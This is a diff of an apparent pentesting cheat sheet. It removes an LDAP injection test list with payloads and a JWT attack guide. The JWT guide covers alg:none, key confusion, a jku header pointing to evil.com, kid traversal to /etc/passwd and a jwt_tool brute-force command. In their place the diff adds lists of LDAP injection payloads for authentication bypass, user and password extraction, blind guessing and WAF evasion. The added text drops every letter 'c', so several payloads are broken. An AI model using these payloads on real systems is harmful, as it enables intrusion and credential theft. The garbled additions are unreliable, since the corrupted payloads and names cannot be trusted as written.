@@ -3058,522 +3058,107 @@ Attribute Injection : "{{7*7}}" → Break HTML attribute
 Node Injection : }}<h1>Injected</h1>{{ → HTML injection + SSTI  
 Template Breakout : ${{7*7}} → Hybrid parsing
 
-# ✅ **LDAP Injection Testcase Names (Names Only)**
+## **LDAP Injection Testcase Names (Names Only)**
 
-1. Basic LDAP Injection Test
-2. LDAP Authentication Bypass Test
-3. LDAP Filter Manipulation Test
-4. LDAP OR-Based Injection Test
-5. LDAP AND-Based Injection Test
-6. LDAP Wildcard Injection Test
-7. LDAP Recursive Query Injection Test
-8. LDAP Attribute Enumeration Test
-9. LDAP Object Enumeration Test
-10. LDAP Blind Injection Test
-11. LDAP Error-Based Injection Test
-12. LDAP Injection via Special Characters
-13. LDAP Injection via URL Parameters
-14. LDAP Injection via JSON Body
-15. LDAP Injection via XML Body
-16. LDAP Injection via Header Manipulation
-17. LDAP Injection via Search Filters
-18. LDAP Injection via Login Form
-19. LDAP Injection to Dump User Attributes
-20. LDAP Injection for Privilege Escalation
-21. LDAP Injection via Base64-Encoded Parameters
-22. LDAP Injection via Nested LDAP Filters
-23. LDAP DN (Distinguished Name) Manipulation Test
-24. LDAP Search Filter Bypass Test
-25. LDAP Group Membership Bypass Test
-26. LDAP Injection in Non-ASCII Input
-27. LDAP Injection via Wildcard Expansion
-28. LDAP Injection via Escaped Characters
-29. LDAP Injection in LDAP-over-SSL (LDAPS)
-30. LDAP Injection for Account Enumeration
----
-Below is a **safe, defensive, real-world LDAP Injection Testing Guide** containing:
+# 🔹 Basi LDAP Injetion Payloads
 
-✅ **Each testcase name**
-✅ **A safe testing payload** (non-destructive, used in pentesting environments only)
+Authentiation Bypass : `*` → Mathes all entries (wildard login)  
+Universal True ondition : `*)(uid=*))(|(uid=*` → Fores always true query  
+Simple Bypass : `admin*)(|(password=*)` → Bypass password hek  
+Wildard Math : `(uid=*)` → Returns all users
 
-⚠️ **No harmful payloads**, no exploitation of real systems — all payloads are *for controlled security testing only*.
+# 🔹 Authentiation Bypass
 
----
+Always True Filter : `*)(|(objetlass=*)),admin*)(|(password=*))→ Mathes any objet  
+Password Ignore : `admin)(&)` → Breaks filter logi  
+Multi-ondition Bypass : `*)(|(uid=admin)(uid=*))` → Ensures valid math  
+User Enumeration : `*)(uid=*))(|(uid=*` → Dumps users list
 
-# ✅ **LDAP Injection Testcases + Safe Testing Payloads**
+# 🔹 LDAP Filter Injetion
 
----
+AND Injetion : `admin)(|(password=*)),*)(uid=*))(|(uid=* Modifies filter ondition  
+OR Injetion : `admin*)(|(uid=*))` → Broadens math  
+NOT Injetion : `admin)(!(password=wrong))` → Ignores invalid passwords
 
-### **1. Basic LDAP Injection Test**
+# 🔹 Data Extration Payloads
 
-**Payload:** `*`
+All Users Dump : `*)(uid=*)` → Extrat user list  
+Email Extration : `*)(mail=*)` → Extrat emails  
+Attribute Dump : `*)(|(n=*)(sn=*))` → Extrat names  
+Password Attribute : `*)(userPassword=*)` → Reveal password nodes
 
----
+# 🔹 Blind LDAP Injetion
 
-### **2. LDAP Authentication Bypass Test**
+Boolean True : `*)(uid=admin)` → hek user existene  
+Boolean False : `*)(uid=invaliduser)` → ompare response differene  
+Length hek : `*)(userPassword=?????)` → Guess password length  
+harater Guess : `*)(userPassword=a*)` → Guess first har
 
-**Payload:** `admin*)(|(password=*))`
+# 🔹 Advaned Injetion Payloads
 
----
+Nested Query Injetion : `*)(|(uid=admin)(mail=*))` → ombine queries  
+Objetlass Dump : `*)(objetlass=*)` → Extrat shema objets  
+Group Extration : `*)(memberof=*)` → Enumerate groups
 
-### **3. LDAP Filter Manipulation Test**
+# 🔹 LDAP Speial haraters
 
-**Payload:** `*)(uid=*))(|(uid=*`
+Wildard Abuse : `*` → Mathes any value  
+OR Operator : `|` → Expands query sope  
+AND Operator : `&` → hains onditions  
+NOT Operator : `!` → Negates ondition
 
----
+# 🔹 Enoding Triks (WAF Bypass)
 
-### **4. LDAP OR-Based Injection Test**
+URL Enoding : `%2a` → Enoded `*`  
+Enoded Parentheses : `%28%29` → Bypass filter parsing  
+Double Enoding : `%252a` → WAF bypass  
+Uniode Enoding : `\2a` → Esapes speial har
 
-**Payload:** `*)(|(uid=*))`
+# 🔹 Filter Bypass Tehniques
 
----
+Whitespae Injetion : `admin )(uid=*)` → Break validation  
+ase Variation : `AdMiN*)(|(UID=*))` → Avoid strit mathing  
+Attribute onfusion : `n=admin*)(uid=*)` → Modify expeted field  
+Partial Injetion : `admin*` → Expand mathes
 
-### **5. LDAP AND-Based Injection Test**
+# 🔹 ontext Breaking Payloads
 
-**Payload:** `admin)(&(objectClass=*))`
+lose Filter : `)` → Terminate filter early  
+Injet New ondition : `)(uid=*)` → Add new lause  
+Full Breakout : `*)(|(n=*))` → Esape original query
 
----
+# 🔹 WAF Bypass (Strutural)
 
-### **6. LDAP Wildcard Injection Test**
+Null Byte Injetion : `%00` → Trunate filter  
+Multi-ondition Injetion : `*)(uid=*))(|(uid=*` → omplex bypass  
+Nested Wildards : `*admin*` → Math partial values  
+Fragment Injetion : `admin*)(|(n=*))`
 
-**Payload:** `*`
-(Used to test unrestricted wildcard matching)
+# 🔹 Brute Fore LDAP Payload List
+## ✅ Basi Injetion
 
----
-
-### **7. LDAP Recursive Query Injection Test**
-
-**Payload:** `*)(sn=*))(|(sn=*`
-
----
-
-### **8. LDAP Attribute Enumeration Test**
-
-**Payload:** `*)(|(mail=*))`
-
----
-
-### **9. LDAP Object Enumeration Test**
-
-**Payload:** `*)(|(objectClass=*))`
-
----
-
-### **10. LDAP Blind Injection Test**
-
-**Payload:** `admin)(&(uid=admin))`
-**Alternative:** `admin)(&(uid=nonexistent))`
-
----
-
-### **11. LDAP Error-Based Injection Test**
-
-**Payload:** `)(invalid=*)`
-
----
-
-### **12. LDAP Injection via Special Characters**
-
-**Payload:** `*)(cn=*))(|(cn=*`
-
----
-
-### **13. LDAP Injection via URL Parameters**
-
-**Payload (encoded):** `%2A%29%28%7C%28uid%3D%2A%29`
-
----
-
-### **14. LDAP Injection via JSON Body**
-
-**Payload:**
-
-```json
-{"username": "*) (|(uid=*))"}
 ```
-
----
-
-### **15. LDAP Injection via XML Body**
-
-**Payload:**
-
-```xml
-<login>
-  <user>*) (|(uid=*))</user>
-</login>
+*
+admin*
+*)(|(uid=*))
+*)(uid=admin)
+*)(mail=*)
+*)(|(objetlass=*))
+admin*)(|(password=*))
+*)(|(uid=admin))
+*)(uid=*)
+*)(n=*)
+*)(sn=*)
+*)(userPassword=*)
+*)(uid=a*)
+*)(uid=b*)
+*)(uid=admin)
+*)(userPassword=a*)
+%2a
+%28uid=%2a%29
+%252a
+\2a
 ```
-
----
-
-### **16. LDAP Injection via Header Manipulation**
-
-**Payload (custom header):**
-`X-User: *)(|(sn=*))`
-
----
-
-### **17. LDAP Injection via Search Filters**
-
-**Payload:**
-`(&(uid=*)(objectClass=*))`
-
----
-
-### **18. LDAP Injection via Login Form**
-
-**Payload:**
-`admin*)(|(uid=*))`
-
----
-
-### **19. LDAP Injection to Dump User Attributes**
-
-**Payload:**
-`*)(|(mail=*))`
-
----
-
-### **20. LDAP Privilege Escalation Filter Bypass Test**
-
-**Payload:**
-`*)(|(memberOf=*))`
-
----
-
-### **21. LDAP Injection via Base64-Encoded Parameters**
-
-**Payload:**
-Base64 of `*)(|(uid=*))` ⇒ **`KikpKCh1aWQ9Kiko`**
-
----
-
-### **22. LDAP Injection via Nested Filters**
-
-**Payload:**
-`*))(|(&(uid=*)(mail=*)))`
-
----
-
-### **23. LDAP DN Manipulation Test**
-
-**Payload:**
-`cn=admin,dc=example,dc=com` → `cn=admin)(cn=*))(|(cn=*,dc=example,dc=com`
-
----
-
-### **24. LDAP Search Filter Bypass Test**
-
-**Payload:**
-`*)(!(uid=*))`
-
----
-
-### **25. LDAP Group Membership Bypass Test**
-
-**Payload:**
-`*)(|(memberOf=*))`
-
----
-
-### **26. LDAP Injection in Non-ASCII Input**
-
-**Payload:**
-`*)(|(uid=é*))`
-
----
-
-### **27. LDAP Injection via Wildcard Expansion**
-
-**Payload:**
-`*)(cn=*)`
-
----
-
-### **28. LDAP Injection via Escaped Characters**
-
-**Payload:**
-`\2a\29\28\7c\28uid\3d\2a\29`
-(escaped version of `*)(|(uid=*))`)
-
----
-
-### **29. LDAP Injection in LDAPS (SSL)**
-
-**Payload:**
-Same payloads as above – test if LDAPS still accepts unvalidated filters.
-
----
-
-### **30. LDAP Account Enumeration Test**
-
-**Payload:**
-Existing user: `admin`
-Non-existing user: `test12345abc`
-
----
-
-**1. Signature Tampering**  
-Modify claims without updating the signature.
-
-`json`  
-Payload:  
-```json
-{
-  "user": "admin",
-  "role": "admin"
-}
-```  
-✅ Expected: Signature checked and token rejected  
-❌ Vulnerable: Tampered token accepted
-
----
-
-**2. alg: none Bypass**  
-Remove signature and set algorithm to `none`.
-
-`json`  
-Header:  
-```json
-{
-  "alg": "none",
-  "typ": "JWT"
-}
-```  
-Payload:  
-```json
-{
-  "user": "admin"
-}
-```  
-✅ Expected: Server rejects token without signature  
-❌ Vulnerable: Token accepted as-is
-
----
-
-**3. RS256 to HS256 Key Confusion**  
-Switch to `HS256` and use public key as HMAC secret.
-
-`json`  
-Header:  
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```  
-✅ Expected: Server rejects signature mismatch  
-❌ Vulnerable: Token accepted with public key as secret
-
----
-
-**4. JWKS Injection via jku Header**  
-Point `jku` to attacker-controlled endpoint.
-
-`json`  
-Header:  
-```json
-{
-  "alg": "RS256",
-  "jku": "https://evil.com/jwks.json"
-}
-```  
-✅ Expected: Server validates JWKS source  
-❌ Vulnerable: JWKS fetched from attacker endpoint
-
----
-
-**5. Embedded JWK (CVE-2018-0114)**  
-Inject public key directly in JWT header.
-
-`json`  
-Header:  
-```json
-{
-  "alg": "RS256",
-  "jwk": {
-    "kty": "RSA",
-    "kid": "evil",
-    "n": "<modulus>",
-    "e": "AQAB"
-  }
-}
-```  
-✅ Expected: Embedded key rejected  
-❌ Vulnerable: Signature verified using attacker key
-
----
-
-**6. Expiration (exp) Manipulation**  
-Extend or remove expiration claim.
-
-`json`  
-Payload:  
-```json
-{
-  "user": "admin",
-  "exp": 9999999999
-}
-```  
-✅ Expected: Server validates `exp`  
-❌ Vulnerable: Token accepted indefinitely
-
----
-
-**7. Audience (aud) & Issuer (iss) Abuse**  
-Modify `aud` or `iss` to bypass validation.
-
-`json`  
-Payload:  
-```json
-{
-  "user": "admin",
-  "aud": "trusted-client",
-  "iss": "evil.com"
-}
-```  
-✅ Expected: Claims checked against known values  
-❌ Vulnerable: Token accepted with spoofed claims
-
----
-
-**8. HMAC Secret Brute-Force**  
-Use dictionary attack on HMAC secret.
-
-Command:  
-```bash
-python3 jwt_tool.py -t <token> -M brute
-```  
-✅ Expected: Strong secret key  
-❌ Vulnerable: Secret guessed via brute force
-
----
-
-**9. Verbose Error Disclosure**  
-Trigger invalid JWTs and inspect errors.
-
-`json`  
-Payload:  
-```json
-INVALID.JWT.TOKEN
-```  
-✅ Expected: Generic error shown  
-❌ Vulnerable: Parser or validation errors disclosed
-
----
-
-**10. Token Replay**  
-Reuse a valid but expired/revoked token.
-
-✅ Expected: Token rejected due to TTL or revocation  
-❌ Vulnerable: Replay accepted without freshness check
-
----
-
-**11. kid Header Injection**  
-Inject directory traversal paths via `kid`.
-
-`json`  
-Header:  
-```json
-{
-  "kid": "../../../../../etc/passwd",
-  "alg": "RS256"
-}
-```  
-✅ Expected: Path sanitized or ignored  
-❌ Vulnerable: Path used in key lookup
-
----
-
-**12. Claim Escalation**  
-Add high-privilege claims manually.
-
-`json`  
-Payload:  
-```json
-{
-  "user": "guest",
-  "role": "admin",
-  "isAdmin": true
-}
-```  
-✅ Expected: Role validated server-side  
-❌ Vulnerable: Role accepted without verification
-
----
-
-**13. Type Confusion**  
-Use incorrect types for claims.
-
-`json`  
-Payload:  
-```json
-{
-  "exp": "not-a-timestamp"
-}
-```  
-✅ Expected: Type checked and rejected  
-❌ Vulnerable: Bypass due to loose parsing
-
----
-
-**14. Header Pollution**  
-Include duplicate or malformed header keys.
-
-`json`  
-Header:  
-```json
-{
-  "alg": "RS256",
-  "alg": "none"
-}
-```  
-✅ Expected: Header cleaned or rejected  
-❌ Vulnerable: Parser confusion leading to bypass
-
----
-
-**15. Psychic Signature (CVE-2022-21449)**  
-Use invalid ECDSA signatures that Java may accept.
-
-✅ Expected: Server rejects invalid EC signatures  
-❌ Vulnerable: Signature accepted due to Java bug
-
-### 🧩 **JWT Parameters to Fuzz (One Per Line)**
-
-```text
-token
-jwt
-access_token
-id_token
-auth_token
-bearer
-session
-credentials
-assertion
-authorization
-jwt_token
-jwt_assertion
-jwt_bearer
-jwt_auth
-jwt_session
-```
-
----
-
-### 🎯 **Fuzzing Payloads (One Per Line)**
-
-```json
-{"alg":"none","typ":"JWT"}
-{"alg":"RS256","jku":"http://127.0.0.1:8080/jwks.json"}
-{"alg":"RS256","jwk":{"kty":"RSA","kid":"evil","n":"<modulus>","e":"AQAB"}}
-{"role":"admin","isAdmin":true}
-{"exp":9999999999}
-{"exp":"not-a-timestamp"}
-{"kid":"../../../../etc/passwd"}
-```
-
 ## SQL Injection (SQLi)
 SQL Injection can be:
 - GET Based
